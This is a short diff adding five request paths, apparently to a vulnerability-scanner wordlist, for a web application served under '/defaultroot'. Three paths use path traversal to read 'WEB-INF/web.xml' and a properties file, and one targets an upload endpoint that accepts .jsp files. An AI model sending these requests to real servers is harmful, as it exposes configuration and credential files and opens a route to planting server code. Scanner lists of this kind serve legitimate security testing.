@@ -1,0 +1,5 @@
+/defaultroot/officeserverservlet
+/defaultroot/extension/smartUpload.jsp?path=information&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0
+/defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
+/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml
+/defaultroot/DownloadServlet?modeType=0&key=x&path=..&FileName=WEB-INF/classes/fc.properties&name=x&encrypt=x&cd=&downloadAll=2
